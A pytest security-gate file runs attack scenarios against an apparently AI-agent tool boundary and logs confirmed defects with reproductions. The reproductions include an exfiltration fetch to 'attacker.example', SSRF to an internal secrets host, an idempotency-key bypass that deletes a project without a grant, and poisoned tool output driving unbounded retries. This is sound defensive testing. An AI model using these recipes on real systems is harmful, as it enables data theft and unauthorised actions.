"""Run every scenario in the corpus against the real system, and record it.

This is the wave's security gate: the point at which 46 scenarios authored
against no implementation are executed against the boundary, the capability
layer, the redaction contract, the acquisition seam, and the claim-support
model that now exist.

**How a defect is recorded.** A scenario whose guarantee is genuinely violated
carries ``xfail(strict=True)`` with the reproduction in ``reason``. Strict is
what makes it a record rather than an exemption: the moment the defect is
fixed, the scenario xpasses and the suite goes red, so nobody has to remember
to come back and delete the annotation. The corpus's own consumption contract
says ``expected_to_fail_today`` is a snapshot the harness must re-evaluate, and
this is that re-evaluation — the corpus files are not edited, so the drift
between what its author expected and what is true is visible rather than
smoothed away.

**Three guards against a suite that proves nothing.**

1. ``test_every_scenario_has_an_exerciser`` — the harness cannot report health
   by simply not running anything. Every id in ``ALL_SCENARIOS`` must have an
   exerciser, and every exerciser must name a real scenario.
2. ``test_a_passing_scenario_names_the_control_that_could_have_failed`` — a
   pass is only accepted alongside a demonstration that the mechanism had a
   reachable opposite outcome. Packet 4D shipped a capability check whose
   ceiling was minted from the request being checked; every test passed, the
   boundary was demonstrably called, and the one control that mattered could
   not fail.
3. ``test_the_not_exercisable_set_is_declared`` — the set of scenarios nobody
   can run is pinned to a literal, so it cannot grow quietly.
"""

from __future__ import annotations

from typing import Final

import pytest

from src.core.contracts.capabilities import CapabilityDenialReason
from src.core.tools import ToolOutcomeStatus

from .exercisers import (
    EXERCISERS,
    expired_approval_is_refused,
    expired_grant_is_refused,
)
from .harness import Observation, Verdict
from .registry import ALL_SCENARIOS
from .types import EnforcementStrength, Scenario

_SCENARIOS_BY_ID: Final[dict[str, Scenario]] = {
    scenario.scenario_id: scenario for scenario in ALL_SCENARIOS
}


NOT_EXERCISABLE: Final[frozenset[str]] = frozenset(
    {
        "poisoned-05-cross-run-evidence-borrow",
        "crosstenant-02-cross-tenant-evidence-artifact-link",
        "crosstenant-04-ws-subscription-cross-tenant-run",
        "replay-02-event-log-replay-duplicate-side-effect",
        "replay-05-stale-ws-cursor-resume-duplicate-effect",
    }
)
"""Scenarios with nothing to run against, pinned so the set cannot grow quietly.

Each one's exerciser states its reason. Four of the five are the wave's already
known limits — no tool path holds an ``AsyncSession``, and no Wave 4 event
consumer exists — rather than anything discovered here. The two evidence
scenarios ARE exercised, against a real database, in
``test_corpus_execution_persistence.py``; they are listed here because the
in-process harness cannot reach them.
"""


DEFECTS: Final[dict[str, str]] = {
    "injection-04-homoglyph-ssrf-destination": (
        "No destination allowlist exists. A READ_ONLY-declared fetch tool "
        "holding a valid capability grant fetches https://attacker.example/ "
        "with no check: CapabilityGrant authorizes a tool NAME and has no "
        "field that can express a destination, and neither ToolSpec nor "
        "SourceFetchInput constrains a URL. Reproduce: grant citation_fetch, "
        "invoke with url='https://attacker.example/exfil?run=<run_id>' -> "
        "SUCCEEDED, handler reached."
    ),
    "deputy-01-classic-fetch-redirect": (
        "Same root cause as injection-04, reached through the confused-deputy "
        "path and against an internal host: a granted fetch tool reaches "
        "http://internal-config.cerebro.local/secrets. There is no SSRF "
        "control, no private-range rejection, and no per-task source "
        "allowlist anywhere in src/core/tools/ or src/core/acquisition/."
    ),
    "poisoned-04-recursive-retry-amplification": (
        "No per-task or per-attempt invocation budget exists at the boundary. "
        "50 successful invocations of one tool under one task all execute. "
        "The circuit breaker bounds consecutive FAILURES only, so a tool "
        "output recommending 'repeat_until context exhausted' is bounded by "
        "nothing the boundary owns."
    ),
    "privesc-03-idempotency-key-scope-swap": (
        "CRITICAL. ToolBoundary.invoke performs the idempotency lookup "
        "(boundary.py:302) BEFORE the capability decision (boundary.py:331), "
        "and ToolAuditStore.find_invocation is keyed on (run_id, "
        "idempotency_key) alone. A caller-supplied idempotency_key that "
        "collides with any prior terminal invocation in the same run returns "
        "that invocation's SUCCEEDED outcome with decision=None -- no "
        "authorization decision is made at all. Reproduce: call "
        "academic_search with idempotency_key='k' and a matching grant, then "
        "call delete_project with idempotency_key='k', "
        "capability_scope='admin:delete_project' and NO grant -> SUCCEEDED."
    ),
    "privesc-05-toctu-revoked-grant": (
        "Capability validity is never re-checked before the side effect "
        "lands. The boundary reads its clock once (boundary.py:267) and "
        "authorizes once; the handler then runs for arbitrarily long. "
        "Reproduce: a grant with a 60s window authorizes a handler that "
        "completes an hour later -> SUCCEEDED with completed_at past "
        "expires_at. Grant revocation is not modelled at all, only expiry."
    ),
    "crosstenant-01-client-supplied-organization-override": (
        "The tool write path has no tenant enforcement. ToolInvocation has no "
        "tenant field, and InMemoryToolAuditStore.persist -- the only store "
        "any tool path uses -- accepts organization_id and discards it "
        "(mediation.py:294-304). enforce_tenant_identity is never reached "
        "from any mediated call. ToolInvocationRepository does enforce it, "
        "but nothing constructs one."
    ),
    "crosstenant-03-unscoped-read-by-id": (
        "CRITICAL, pre-existing and still live on this branch. "
        "verify_project_access (src/api/websocket/auth.py:101-124) takes no "
        "organization parameter and returns `user_id is not None`, so any "
        "authenticated user is authorized for any project. Reached from "
        "src/api/routes/websocket.py:211 and :345. `git log -1 -- "
        "src/api/websocket/auth.py` on this branch is 6419b1f (the Wave 3 "
        "merge), so packet 4-Sec's fix is NOT an ancestor of this tree."
    ),
    "crosstenant-05-idempotency-key-collision": (
        "Idempotency dedup is not tenant-scoped. "
        "InMemoryToolAuditStore.find_invocation accepts organization_id and "
        "never reads it (mediation.py:283-292). Nothing at the boundary binds "
        "a run_id to an organization either, so a caller naming another "
        "tenant's run is not refused and is then served that tenant's "
        "recorded outcome without executing."
    ),
    "replay-03-idempotency-key-with-mutated-input": (
        "Same root cause as privesc-03. A key presented with different input "
        "is a cache hit, not a conflict: the call returns SUCCEEDED carrying "
        "the ORIGINAL input, and the handler is not re-entered. An "
        "idempotency key is a slot that can be silently repointed at "
        "different work."
    ),
    "oversized-01-oversized-query-string": (
        "No input size ceiling exists at any layer. A 2,000,000-character "
        "source_uri on the shipped SourceFetchInput model is validated, "
        "hashed, redacted, and persisted. ToolSpec.__post_init__ requires a "
        "timeout, a sensitivity, and SecretRef-typed credential fields -- but "
        "nothing about size -- so an unbounded field is what a tool author "
        "gets by omission."
    ),
    "oversized-02-deeply-nested-json": (
        "No nesting-depth limit exists. A 400-level nested object is "
        "validated, then walked recursively by _json_ready, again by redact, "
        "again by canonical JSON serialization, and persisted."
    ),
    "oversized-03-oversized-retrieved-snapshot": (
        "FilesystemSnapshotStore.put has no maximum size, and neither the "
        "SnapshotStore protocol nor the acquisition service declares one. An "
        "oversized fetched body is persisted whole and re-read whole on every "
        "future evidence lookup."
    ),
    "oversized-05-unbounded-pagination-request": (
        "Same root cause as oversized-01, on a numeric field: "
        "max_results=999,999,999 is accepted and recorded. Registration never "
        "requires a range bound."
    ),
    "sensitive-04-approval-toctu-revocation": (
        "Approval validity is never re-checked before the side effect lands. "
        "Reproduce: an approval with a 10s window authorizes an EXFILTRATION "
        "handler that completes an hour later -> SUCCEEDED with completed_at "
        "past the approval's expires_at. Same shape as privesc-05, applied to "
        "approvals. Approval revocation is not modelled, only expiry."
    ),
}
"""Every DETERMINISTIC guarantee this harness found violated, with its repro.

Kept here rather than as an edit to the corpus: softening a scenario to make
the suite green is exactly what this packet was told not to do, and a defect
that lives in the harness stays legible as a defect.
"""


def _param(scenario: Scenario) -> pytest.param:
    marks = []
    if scenario.scenario_id in DEFECTS:
        marks.append(
            pytest.mark.xfail(strict=True, reason=DEFECTS[scenario.scenario_id])
        )
    return pytest.param(scenario, id=scenario.scenario_id, marks=marks)


# ----------------------------------------------------------------------------
# guards on the harness itself
# ----------------------------------------------------------------------------


class TestTheHarnessCannotReportHealthByRunningNothing:
    def test_every_scenario_has_an_exerciser(self) -> None:
        missing = sorted(
            scenario.scenario_id
            for scenario in ALL_SCENARIOS
            if scenario.scenario_id not in EXERCISERS
        )
        assert not missing, (
            f"{len(missing)} scenario(s) would never be executed: {missing}. "
            "A corpus nobody runs reports no failures for the same reason a "
            "corpus that passes does."
        )

    def test_no_exerciser_names_a_scenario_that_does_not_exist(self) -> None:
        unknown = sorted(set(EXERCISERS) - set(_SCENARIOS_BY_ID))
        assert not unknown, (
            f"exerciser(s) {unknown} name no scenario in ALL_SCENARIOS; a "
            "renamed scenario would otherwise leave a test running against "
            "nothing"
        )

    def test_the_not_exercisable_set_is_declared(self) -> None:
        assert set(_SCENARIOS_BY_ID) >= NOT_EXERCISABLE
        assert NOT_EXERCISABLE.isdisjoint(DEFECTS), (
            "a scenario cannot be both unrunnable and a proven defect"
        )

    def test_every_defect_names_a_deterministic_scenario(self) -> None:
        advisory = sorted(
            scenario_id
            for scenario_id in DEFECTS
            if _SCENARIOS_BY_ID[scenario_id].strength
            is not EnforcementStrength.DETERMINISTIC
        )
        assert not advisory, (
            f"{advisory} are ADVISORY; an advisory result is never a "
            "reportable boundary defect, so recording one as an xfail would "
            "misstate what the corpus proves"
        )


# ----------------------------------------------------------------------------
# the corpus itself
# ----------------------------------------------------------------------------


@pytest.mark.parametrize("scenario", [_param(s) for s in ALL_SCENARIOS])
async def test_scenario_guarantee_holds(scenario: Scenario) -> None:
    """Run one scenario against the real system and assert its floor held."""

    observation = await EXERCISERS[scenario.scenario_id]()

    if observation.verdict is Verdict.NOT_EXERCISABLE:
        assert scenario.scenario_id in NOT_EXERCISABLE, (
            f"{scenario.scenario_id} reported itself unrunnable but is not in "
            f"NOT_EXERCISABLE; add it there with its reason so the set of "
            f"scenarios nobody runs stays visible. Reason given: "
            f"{observation.evidence}"
        )
        pytest.skip(observation.evidence)

    assert scenario.scenario_id not in NOT_EXERCISABLE, (
        f"{scenario.scenario_id} is listed as unrunnable but produced "
        f"{observation.verdict.value}; remove it from NOT_EXERCISABLE"
    )

    assert observation.verdict is not Verdict.VIOLATED, (
        f"{scenario.scenario_id}: {scenario.expected_outcome.guarantee.value} "
        f"was not enforced.\n\n{observation.evidence}\n\n"
        f"The corpus states that when the named mechanism is absent the "
        f"outcome must still be denial: "
        f"{scenario.expected_outcome.on_missing_enforcement}"
    )


@pytest.mark.parametrize(
    "scenario",
    [
        pytest.param(s, id=s.scenario_id)
        for s in ALL_SCENARIOS
        if s.scenario_id not in DEFECTS and s.scenario_id not in NOT_EXERCISABLE
    ],
)
async def test_a_passing_scenario_names_the_control_that_could_have_failed(
    scenario: Scenario,
) -> None:
    """A pass is only credited when the mechanism's opposite was reachable.

    This is the guard against the failure packet 4D nearly shipped: a control
    minted from the thing it checks passes every test while being incapable of
    refusing anything. ``Observation.__post_init__`` requires the field; this
    asserts it at the suite level too, so deleting the dataclass check does not
    silently remove the guarantee.
    """

    observation = await EXERCISERS[scenario.scenario_id]()
    assert observation.verdict in {Verdict.HELD, Verdict.HELD_VIA_FLOOR}
    assert observation.control.strip(), (
        f"{scenario.scenario_id} reported {observation.verdict.value} without "
        "naming a paired outcome showing the mechanism could have gone the "
        "other way"
    )


@pytest.mark.parametrize(
    "scenario",
    [
        pytest.param(s, id=s.scenario_id)
        for s in ALL_SCENARIOS
        if s.strength is EnforcementStrength.ADVISORY
    ],
)
async def test_an_advisory_result_is_never_credited_as_the_security_bar(
    scenario: Scenario,
) -> None:
    """An ADVISORY pass must not be recorded as a satisfied guarantee.

    The wave's non-goal makes prompt wording and classifiers defense layers
    rather than boundaries. The corpus encodes that in ``strength``; this
    asserts the harness honours it, by requiring every advisory observation to
    carry an explicit reason it is worth less than it reads.
    """

    observation = await EXERCISERS[scenario.scenario_id]()
    if observation.verdict is Verdict.NOT_EXERCISABLE:
        pytest.skip(observation.evidence)
    assert observation.weakened_by, (
        f"{scenario.scenario_id} is ADVISORY, so its result cannot stand as "
        "the security bar; the observation must say why"
    )


class TestTheTwoTimeOfUseDefectsAreAboutRecheckingAndNotAboutExpiry:
    """Pin what privesc-05 and sensitive-04 actually claim.

    Both are recorded above as defects because validity is never re-evaluated
    before the side effect lands. That claim is only meaningful if the expiry
    checks themselves work — otherwise the honest finding would be the much
    larger "expiry is not implemented", and the reproduction in ``DEFECTS``
    would be describing the wrong bug.

    These exist because a suite-level mutation check found both expiry branches
    SURVIVING: the exercisers computed a control for each, but only inside the
    unreachable branch of an observation that had already been ruled VIOLATED,
    so nothing asserted either one. A control that is computed and never
    asserted is not a control.
    """

    async def test_a_grant_that_expired_before_the_request_is_refused(self) -> None:
        outcome = await expired_grant_is_refused()
        assert outcome.status is ToolOutcomeStatus.DENIED
        assert (
            outcome.decision is not None
            and outcome.decision.denial_reason is CapabilityDenialReason.GRANT_EXPIRED
        )

    async def test_an_approval_that_expired_before_the_request_is_refused(
        self,
    ) -> None:
        outcome = await expired_approval_is_refused()
        assert outcome.status is ToolOutcomeStatus.DENIED
        assert (
            outcome.decision is not None
            and outcome.decision.denial_reason
            is CapabilityDenialReason.APPROVAL_EXPIRED
        )


def test_the_report_covers_every_scenario_exactly_once() -> None:
    """The three outcome buckets partition the corpus.

    Without this a scenario could drop out of all of them — no defect, no skip,
    and no assertion — which is the shape of a corpus that looks clean because
    nothing looked at it.
    """

    exercised = set(_SCENARIOS_BY_ID) - NOT_EXERCISABLE - set(DEFECTS)
    assert exercised | NOT_EXERCISABLE | set(DEFECTS) == set(_SCENARIOS_BY_ID)
    assert len(exercised) + len(NOT_EXERCISABLE) + len(DEFECTS) == len(ALL_SCENARIOS)


def test_observation_requires_a_control_for_a_pass() -> None:
    """The control requirement is enforced, not merely documented."""

    with pytest.raises(ValueError, match="control"):
        Observation(verdict=Verdict.HELD, evidence="something held")
    with pytest.raises(ValueError, match="control"):
        Observation(verdict=Verdict.HELD_VIA_FLOOR, evidence="the floor held")
    # A violation needs no control: there is no passing outcome to justify.
    Observation(verdict=Verdict.VIOLATED, evidence="the effect occurred")
